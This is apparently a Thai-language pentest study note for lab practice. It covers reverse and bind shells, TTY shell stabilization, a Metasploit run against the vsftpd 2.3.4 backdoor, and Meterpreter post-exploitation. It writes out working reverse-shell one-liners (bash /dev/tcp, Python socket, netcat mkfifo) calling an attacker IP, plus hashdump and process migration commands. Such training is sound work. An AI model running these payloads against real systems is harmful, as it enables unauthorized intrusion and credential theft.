# 🐚 Reverse Shells & Metasploit Exploitation Framework

> **Phase:** `Phase B — Scripting & Recon` | **Tags:** `#shells` `#metasploit` `#payloads` `#meterpreter`  
> **Status:** ⏳ Upcoming | **Focus:** Netcat Shells, Shell Stabilization, Metasploit Exploitation & Meterpreter

---

## 📑 Core Modules Overview

- [ ] [[#Module 01: Reverse Shells vs Bind Shells Mechanics|Module 01: Reverse Shells vs Bind Shells]]
- [ ] [[#Module 02: Shell Stabilization & TTY Upgrade|Module 02: TTY Shell Stabilization]]
- [ ] [[#Module 03: Metasploit Framework Exploitation|Module 03: Metasploit Framework & Payloads]]
- [ ] [[#Module 04: Meterpreter Post-Exploitation|Module 04: Meterpreter Post-Exploitation]]

---

## Module 01: Reverse Shells vs Bind Shells Mechanics
- **Status:** ⏳ Not Started
- **Core Concept:** ทำไมต้อง Reverse Shell? (เครื่องเหยื่อเป็นฝ่ายติดต่อกลับมาหา Attacker ทำให้สามารถทะลวงผ่าน Outbound Firewall และ NAT ได้อย่างง่ายดาย)

### 💻 Core Shell Payloads
```bash
# 1. Attacker Listener (เปิดรอรับการติดต่อ)
nc -lvnp 4444

# 2. Bash Reverse Shell บน Linux Victim
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# 3. Python 3 Reverse Shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

# 4. Netcat OpenBSD
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f
```

---

## Module 02: Shell Stabilization & TTY Upgrade
- **Status:** ⏳ Not Started
- **Core Concept:** การอัปเกรด Dumb Shell ที่พิมพ์ลูกศรไม่ได้ กด `Ctrl + C` แล้วหลุด ให้กลายเป็น Fully Interactive Terminal

### 💻 TTY Upgrade Recipe (ทำตามทีละขั้นตอน)
```bash
# ขั้นที่ 1: เกิด PTY Process ด้วย Python บนเครื่องเหยื่อ
python3 -c 'import pty; pty.spawn("/bin/bash")'

# ขั้นที่ 2: กด Ctrl + Z เพื่อถอย Shell กลับมาที่เครื่อง Kali ชั่วคราว

# ขั้นที่ 3: สั่งให้ Terminal เครื่อง Kali ส่งสัญญาณ Raw ตรงไปยังเครื่องเหยื่อ
stty raw -echo; fg

# ขั้นที่ 4: ตั้งค่าตัวแปร Terminal บนเครื่องเหยื่อ
export TERM=xterm-256color
reset
```

---

## Module 03: Metasploit Framework Exploitation
- **Status:** ⏳ Not Started
- **Core Concept:** สถาปัตยกรรม Metasploit: Exploits (โค้ดเจาะ), Payloads (โค้ดที่รันหลังเจาะสำเร็จ), Encoders, Auxiliary และ Post-Exploitation

### 💻 Essential Metasploit Commands
```bash
# เปิดคอนโซลแบบเงียบ
msfconsole -q

# ค้นหา Exploit
search vsftpd
search type:exploit platform:linux apache

# เลือกใช้งาน Module และตั้งค่าเป้าหมาย
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 10.10.10.15
set RPORT 21

# รันโจมตี
exploit
```

---

## Module 04: Meterpreter Post-Exploitation
- **Status:** ⏳ Not Started
- **Core Concept:** การสั่งการผ่าน Meterpreter Payload ระดับสูงที่ทำงานบน Memory ไม่แตะต้องดิสก์ (Fileless Payload)

### 💻 Essential Meterpreter Commands
```text
sysinfo             # ดูข้อมูล OS และสถาปัตยกรรม CPU
getuid              # ดูว่าปัจจุบันถือสิทธิ์ระดับใด (หวังผล NT AUTHORITY\SYSTEM หรือ root)
ps                  # ส่อง Process บนเครื่องเหยื่อ
migrate <PID>       # ย้าย Payload เข้าไปแฝงตัวใน Process ที่ปลอดภัย (เช่น explorer.exe)
hashdump            # สกัด Password Hashes ทั้งหมดออกจากระบบ
shell               # ถอยกลับไปเป็น OS Shell ดั้งเดิม
```

### 🧠 Feynman Takeaway & Reflection
- *สรุปด้วยคำพูดตัวเอง:* 
- *จุดที่น่าสนใจ / ข้อควรระวัง:*
